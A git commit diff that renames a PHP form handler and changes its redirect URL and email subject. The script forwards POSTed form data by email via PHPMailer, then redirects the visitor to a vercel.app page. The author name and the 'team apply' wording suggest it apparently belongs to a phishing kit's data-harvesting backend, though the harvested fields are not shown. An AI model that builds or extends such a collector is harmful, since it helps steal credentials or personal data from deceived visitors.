8550360c9110dea7657b188c6df5a3de37c0f58d
Meri3394 <metaserve7@gmail.com>
2025-07-10 15:04:09 +0500

    Update and rename YG.php to Jala.php

--- Jala.php
+++ Jala.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://concrete-team-apply.vercel.app/");
+header("Location: https://submit-team-info.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'YG';
+        $mail->Subject = 'jala';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
